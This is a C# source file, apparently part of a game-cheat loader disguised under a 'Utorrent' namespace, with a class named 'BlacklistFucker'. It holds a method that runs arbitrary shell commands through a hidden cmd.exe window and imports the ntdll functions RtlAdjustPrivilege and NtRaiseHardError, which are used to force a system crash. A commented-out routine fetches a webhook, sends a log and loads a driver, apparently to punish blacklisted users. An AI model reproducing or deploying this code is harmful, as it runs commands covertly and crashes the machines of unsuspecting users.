using Utorrent.Forms;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace Utorrent.Misc
{
    class BlacklistFucker
    {
        private string webhook;
        private string caminho = "SOFTWARE\\FGAim";
        private string usuario = "Não tem usuário salvo.";

        //public void OMG()
        //{
        //    if (!Loader.KeyAuthApp.response.success)
        //    {
        //        Loader.KeyAuthApp.init();
        //    }
        //    webhook = Loader.KeyAuthApp.var("blacklist");
        //    sendlog();
        //    driver();
        //    Environment.Exit(-1);
        //}

        public void ExecuteCommand(string command)
        {
            Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            });
            process.WaitForExit();
            process.StandardOutput.ReadToEnd();
            process.StandardError.ReadToEnd();
            int exitCode = process.ExitCode;
            process.Close();
        }

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);


 
    }
}
